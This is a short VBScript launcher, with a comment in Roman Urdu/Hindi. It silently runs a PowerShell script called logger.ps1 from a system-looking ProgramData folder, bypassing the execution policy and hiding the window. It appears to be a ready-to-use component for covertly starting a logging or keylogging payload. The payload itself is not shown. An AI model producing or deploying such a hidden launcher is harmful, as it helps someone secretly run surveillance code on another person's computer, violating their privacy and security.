Set WshShell = CreateObject("WScript.Shell")
' Neeche diye gaye path mein check kar lein ke aapki ps1 file wahi hai ya nahi
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\ProgramData\SystemData\logger.ps1""", 0
Set WshShell = Nothing